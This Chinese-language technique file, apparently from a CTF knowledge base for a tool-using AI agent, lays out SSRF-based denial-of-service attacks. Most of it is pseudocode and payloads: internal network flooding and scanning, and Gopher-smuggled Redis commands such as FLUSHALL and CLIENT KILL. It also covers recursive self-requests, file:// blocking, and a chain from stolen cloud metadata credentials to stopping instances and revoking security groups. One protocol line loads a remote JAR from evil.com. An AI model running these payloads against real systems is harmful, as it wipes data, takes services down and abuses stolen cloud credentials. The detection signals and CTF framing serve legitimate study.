# SSRF 驱动的拒绝服务

## 场景

SSRF (Server-Side Request Forgery) 不仅是数据泄露漏洞，更是强大的 DoS 武器。攻击者通过目标服务器发起对内部服务的请求，利用内部网络的信任关系和低延迟特性进行放大攻击。

```
SSRF → DoS 的独特优势:
  - 源 IP 是目标服务器自身 → 内部防火墙不对其限速
  - 内部网络带宽远大于外部 (1Gbps-100Gbps vs 10-100Mbps)
  - 内部服务默认信任 (无认证) → 直接可打
  - 单一 SSRF → 可攻击多个内部目标
```

## 输入信号

- 应用日志中 `http_client` / `requests` / `curl` 请求目标 IP 为内网地址 (10.x / 172.16-31.x / 192.168.x)
- 出站请求中出现 Gopher / Dict / File / FTP 等非 HTTP 协议 scheme
- 单请求触发服务器向内网发起 > 10 个并发请求 (正常 SSRF 通常单次请求)
- 连接 Redis/Memcached/MySQL 等非 HTTP 端口的出站连接 (`ss -tan` 中目标 port 6379/11211/3306)
- 内网服务监控显示带宽/连接数突增，但来源 IP 全为某台 Web 服务器 (SSRF 放大)
- 云元数据端点 `169.254.169.254` 被频繁访问 (container/EC2 metadata 泄露)
- 应用错误日志中出现 `gopher://` / `dict://` URL scheme 解析错误 (SSRF 协议走私尝试)
- 响应时间随请求参数增加呈指数级增长 (递归 SSRF → 级联效果)

---

## 方法 1: 内部服务洪泛

### 原理

利用 SSRF 通过目标服务器向内部服务发起请求，消耗内部带宽和连接。

```
攻击路径:
  攻击者 → POST /api/fetch { url: "http://internal-service:8080/" }
          → 目标服务器向 internal-service 发请求
          → 并发 1000 个 → 打满内部服务

乘数效应:
  攻击者带宽: 1 Mbps (发送 1000 个 SSRF 请求)
  目标服务器 → 内部: 1000 个并发连接 × 10Mbps 内部带宽
  放大: 至少 10x，内部网络越宽越大
```

### 伪代码

```
function ssrf_internal_flood(ssrf_endpoint, internal_targets, 
                              concurrency=200, duration=120):
    """
    通过 SSRF 洪泛内部服务
    
    ssrf_endpoint: 目标服务器上存在 SSRF 的端点
      例如: /api/proxy?url=, /api/fetch?remote=, /api/webhook/test
      
    internal_targets: 内部可达的服务
      例如: redis:6379, postgres:5432, elastic:9200
           其他微服务, K8s API, metadata endpoint
    """
    
    deadline = now() + duration
    
    while now() < deadline:
        for target in internal_targets:
            for _ in range(concurrency // len(internal_targets)):
                spawn:
                    # 构造 SSRF 请求
                    payload = {
                        "url": f"http://{target}/",
                        "method": "GET",
                        "timeout": 0,  # 无超时 → 连接挂起
                        "follow_redirects": True
                    }
                    
                    try:
                        http_post(ssrf_endpoint, body=payload, timeout=5)
                    except TimeoutError:
                        pass  # 目标服务器可能在等待内部响应
        
        sleep(0.1)
    
    # 效果:
    # 内部服务收到的所有连接都来自"合法"的内部 IP (目标服务器)
    # 防火墙/ACL 不会阻止 (内网到内网流量)
    # 内部服务的连接池/线程池被占满
```

### 内部扫描 + 识别攻击面

```
# 先通过 SSRF 扫描内部网络

function ssrf_internal_scan(ssrf_endpoint, subnet="10.0.0.0/24"):
    """
    通过 SSRF 扫描内部网络 → 发现更多攻击目标
    """
    
    live_hosts = []
    
    for ip in subnet_iter(subnet):
        for port in [22, 80, 443, 3000, 5000, 5432, 6379, 
                     8000, 8080, 8443, 9090, 9200, 11211, 27017]:
            resp = ssrf_request(ssrf_endpoint, f"http://{ip}:{port}/")
            
            # 根据错误信息区分:
            # - timeout → host unreachable → 不存在
            # - connection refused → host 存在, 端口关闭
            # - 200/302/401 → host 存在, 端口开放
            # - read error → host 存在, 端口可能开放 (非 HTTP)
            
            if resp.error_type in ["connection_refused", "read_error",
                                    "http_200", "http_302", "http_401"]:
                if ip not in [h[0] for h in live_hosts]:
                    live_hosts.append((ip, port))
                    print(f"[*] Live: {ip}:{port}")
    
    return live_hosts
```

## 方法 2: SSRF → Redis/DB 命令注入 DoS

### 原理

通过 SSRF 访问内部 Redis/Memcached/MongoDB 等非 HTTP 服务，注入恶意命令。

```
Redis via SSRF (HTTP 走私):
  gopher://redis:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a
  
  → 目标服务器向 redis:6379 发送: *1\r\n$8\r\nFLUSHALL\r\n
  → Redis 执行 FLUSHALL → 所有缓存数据被清空

其它破坏性命令:
  FLUSHALL / FLUSHDB            → 清空所有数据
  DEBUG SLEEP 30                → 阻塞 Redis 30 秒
  CONFIG SET dir /tmp           → 修改配置
  CLIENT KILL addr *:*          → 断开所有客户端
  SCRIPT KILL                   → 杀死正在执行的 Lua 脚本
  SHUTDOWN                      → 关闭 Redis
```

### 利用不同协议进行 SSRF DoS

```
协议利用矩阵:

dict://redis:6379/info          → 字典协议访问 Redis
gopher://redis:6379/_COMMAND    → Gopher 协议注入任意命令
file:///dev/random              → 读取 /dev/random 阻塞 (熵不足)
file:///dev/zero                → 无限读取 0 字节
ftp://slow-server:21/           → FTP 被动模式钩子
tftp://evil:69/                 → TFTP 重试循环
ldap://internal-ldap:389/       → LDAP 查询注入
jar://http://evil.com/evil.jar!/ → JAR 协议远程加载
```

### 伪代码

```
function ssrf_redis_dos(ssrf_endpoint, redis_host="redis:6379"):
    """
    通过 SSRF 攻击内部 Redis
    
    利用 Gopher 协议走私 Redis 命令
    """
    
    # 1. 探测 Redis 是否存在
    resp = ssrf_request(ssrf_endpoint, 
                        f"gopher://{redis_host}/_PING%0d%0a")
    if "+PONG" in resp.body:
        print("[!] Redis reachable via SSRF")
    
    # 2. DoS 向量
    
    # 2a. DEBUG SLEEP — 阻塞 Redis 主线程
    for i in range(10):
        spawn:
            # DEBUG SLEEP 30 → Redis 单线程阻塞 30s
            sleep_cmd = f"DEBUG SLEEP 30"
            gopher_payload = encode_to_gopher(sleep_cmd + "\r\n")
            ssrf_request(ssrf_endpoint, 
                         f"gopher://{redis_host}/_{gopher_payload}")
    
    # 2b. FLUSHALL — 清空所有数据
    flush_payload = encode_to_gopher("FLUSHALL\r\n")
    ssrf_request(ssrf_endpoint, 
                 f"gopher://{redis_host}/_{flush_payload}")
    
    # 2c. CONFIG SET — 修改危险配置
    # 修改持久化路径 → 覆写关键文件
    config_payload = encode_to_gopher(
        "CONFIG SET dir /\r\n"
        "CONFIG SET dbfilename tmp\r\n"
        "DEBUG SLEEP 30\r\n"
    )
    ssrf_request(ssrf_endpoint, 
                 f"gopher://{redis_host}/_{config_payload}")
    
    # 2d. CLIENT KILL — 断开所有客户端
    kill_payload = encode_to_gopher(
        "CLIENT KILL TYPE normal\r\n"  # 断开所有普通客户端
    )
    ssrf_request(ssrf_endpoint,
                 f"gopher://{redis_host}/_{kill_payload}")
    
    # 2e. SCRIPT KILL — 杀死正在执行的脚本
    script_payload = encode_to_gopher("SCRIPT KILL\r\n")
    ssrf_request(ssrf_endpoint,
                 f"gopher://{redis_host}/_{script_payload}")
```

### Gopher 协议编码

```
function encode_to_gopher(command):
    """
    将 Redis 命令编码为 Gopher URL 安全格式
    
    Redis 协议 (RESP):
      *<argc>\r\n$<len>\r\n<arg>\r\n...
    
    Gopher URL 编码:
      转义特殊字符 → URL encode
      \r\n → %0d%0a
    """
    
    # 简单: 直接拼接 RESP 格式
    # 复杂命令需要正确计算 argc 和参数长度
    
    parts = command.split()
    resp = f"*{len(parts)}\r\n"
    for p in parts:
        resp += f"${len(p)}\r\n{p}\r\n"
    
    # Gopher URL encode
    encoded = ""
    for c in resp:
        if c in "\r\n":
            encoded += f"%{ord(c):02x}"
        else:
            encoded += c
    
    return encoded
```

## 方法 3: SSRF → 递归爆炸

### 原理

使目标服务器通过 SSRF 调用自身，形成递归/循环：

```
攻击:
  POST /api/proxy?url=http://localhost:8080/api/proxy?url=http://localhost:8080/api/proxy?url=...

效果:
  目标服务器 → SSRF → 自身 → SSRF → 自身 → ... 无限递归
  
结果:
  - 无限递归 → 栈溢出 (StackOverflow)
  - 或: 连接池耗尽 (每个递归占用一个连接)
  - 或: 线程池耗尽
```

### 伪代码

```
function ssrf_recursive_bomb(ssrf_endpoint, port):
    """
    SSRF 递归攻击 → 服务器自我连接耗尽
    
    三种变体:
    """
    
    # 变体1: 直接递归
    recursive_url = (
        f"http://localhost:{port}{ssrf_endpoint}"
        f"?url=http://localhost:{port}{ssrf_endpoint}"
        f"%3Furl%3Dhttp://localhost:{port}{ssrf_endpoint}"
        # ... 可以嵌套多层
    )
    
    for _ in range(50):
        spawn:
            http_post(ssrf_endpoint, body={"url": recursive_url})
    
    # 变体2: 两台服务器互相 SSRF
    # 服务器A 的 SSRF → 服务器B 的 SSRF → 服务器A 的 SSRF → ...
    # A_url = f"http://server-b:8080/api/proxy?url=http://server-a:8080/api/proxy?url=..."
    
    # 变体3: 微服务链式爆炸
    # A SSRF → B SSRF → C SSRF → D ... → 每个服务消耗一个线程
    # 链中的任意服务挂掉 → 上游超时/重试 → 级联效果
```

## 方法 4: SSRF → 云元数据服务攻击

### 原理

通过 SSRF 访问云元数据端点，获取 IAM 凭证后实施进一步的破坏。

```
AWS:
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

GCP:
  http://metadata.google.internal/computeMetadata/v1/
  
Azure:
  http://169.254.169.254/metadata/instance

获取凭证后:
  - 使用临时凭证调用云 API
  - 创建大量资源 → 计费爆炸
  - 删除/停止实例 → 直接 DoS
  - 修改安全组 → 把正常流量 block 掉
```

### 伪代码

```
function ssrf_cloud_metadata_chain(ssrf_endpoint):
    """
    SSRF → 元数据 → IAM 凭证 → 云资源破坏
    """
    
    # 1. 获取 IAM 角色名
    resp = ssrf_request(ssrf_endpoint,
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    
    role_name = resp.body.strip()
    print(f"[*] IAM role: {role_name}")
    
    # 2. 获取临时凭证
    resp = ssrf_request(ssrf_endpoint,
        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
    
    creds = parse_json(resp.body)
    # {
    #   "AccessKeyId": "ASIA...",
    #   "SecretAccessKey": "...",
    #   "Token": "...",
    #   "Expiration": "2024-..."
    # }
    
    print(f"[!] Got temporary credentials (expires: {creds.Expiration})")
    
    # 3. 使用凭证破坏
    aws_session = create_aws_session(
        creds.AccessKeyId,
        creds.SecretAccessKey,
        creds.Token
    )
    
    # 3a. 停止所有 EC2
    instances = aws_session.ec2.describe_instances()
    for inst in instances:
        aws_session.ec2.stop_instances([inst.id])
        print(f"[*] Stopped {inst.id}")
    
    # 3b. 删除所有 S3 对象
    buckets = aws_session.s3.list_buckets()
    for bucket in buckets:
        aws_session.s3.delete_bucket_policy(bucket.name)
        # aws_session.s3.delete_bucket(bucket.name)  # 需要非空
    
    # 3c. 修改安全组 → 拒绝所有入流量
    for sg in aws_session.ec2.describe_security_groups():
        aws_session.ec2.revoke_security_group_ingress(
            GroupId=sg.id,
            IpPermissions=[{
                "IpProtocol": "-1",
                "IpRanges": [{"CidrIp": "0.0.0.0/0"}]
            }]
        )
```

## 方法 5: SSRF → File:// 协议阻塞

### 原理

利用 `file://` 协议读取阻塞性文件，消耗服务器资源。

```
阻塞文件:
  file:///dev/random    → 熵不足时阻塞 (Linux)
  file:///dev/urandom   → 非阻塞但 CPU 密集
  file:///dev/zero      → 无限读取 (内存消耗)
  file:///proc/self/mem → 进程自身内存映射
  file:///sys/...       → 某些 sysfs 文件读取触发硬件交互
```

### 伪代码

```
function ssrf_file_blocking(ssrf_endpoint):
    """
    利用 file:// 协议造成服务器阻塞
    """
    
    # 1. /dev/random 阻塞
    # /dev/random 在熵池不足时阻塞读取
    # 服务器可能在容器/VM中熵源有限
    for _ in range(20):
        spawn:
            ssrf_request(ssrf_endpoint, 
                "file:///dev/random", 
                timeout=300)  # 长超时 → 阻塞线程
    
    # 2. /dev/zero 无限读取
    # 设置无限读取 → 内存持续增长 → OOM
    for _ in range(5):
        spawn:
            ssrf_request(ssrf_endpoint,
                "file:///dev/zero",
                max_size_limit=None)  # 无限制
    
    # 3. 大文件读取 (如果知道路径)
    huge_files = [
        "/var/log/syslog",
        "/var/log/messages", 
        "/proc/kcore",          # 内核内存镜像 (64位 ~128TB 虚拟)
        "/sys/kernel/debug/..."  # debugfs
    ]
    
    for f in huge_files:
        spawn:
            ssrf_request(ssrf_endpoint, f"file://{f}")
```

## 攻击链

```
SSRF → DoS 综合链:

Phase 1 — 内网发现:
  1. SSRF 扫描内部网络 (10.x, 172.16-31.x, 192.168.x)
  2. 识别可达的内部服务 (DB, Cache, MQ, 其他微服务)

Phase 2 — 内部洪泛:
  3. 通过 SSRF 向所有内部服务发起并发洪泛
  4. 内部网络带宽大 → 快速打满

Phase 3 — 协议注入:
  5. SSRF → Gopher → Redis/Memcached 命令注入
  6. FLUSHALL / DEBUG SLEEP / CLIENT KILL
  7. MongoDB / MySQL / PostgreSQL 协议注入

Phase 4 — 云环境升级:
  8. SSRF → 云元数据 → 获取 IAM 凭证
  9. 凭证 → 云 API → 大规模破坏
  10. 停止实例、删除资源、修改安全组

Phase 5 — 循环耗尽:
  11. SSRF 递归 → 服务器自己攻击自己
  12. 连接池 + 线程池双耗尽
```

## 参考资料

1. CVE-2021-21315 — System Information SSRF → Command Injection
2. "SSRF Bible" — Wallarm (Gopher/Dict/File protocol smuggling)
3. "SSRF to Redis: Complete exploitation chain" — Bishop Fox, 2017
4. CVE-2019-5418 — Rails File Content Disclosure (SSRF → /proc/self/mem)
5. "AWS IMDSv2: SSRF to Full Account Takeover" — Rhino Security Labs, 2020
6. "Gopher Protocol: Attacking Redis via SSRF" — Acko.net, 2017
7. CVE-2022-22965 — Spring4Shell (SSRF → internal service exploit)
8. "Recursive SSRF: When servers attack themselves" — Detectify, 2020
9. AWS instance metadata service (IMDS) — 169.254.169.254 attack surface
10. GCP/Azure metadata endpoints — cloud metadata service security

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| SSRF 端点探测 | `http_probe` | 探测 SSRF 参数及支持的协议 |
| 内部扫描 | `http_probe` | SSRF 盲扫内部网络 |
| 技术搜索 | `kb_router` | 搜索 ssrf / gopher / redis / internal |
| 技术查阅 | `kb_read_file` | 读取本文件及 04-ssrf 分类下的 SSRF 技术 |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
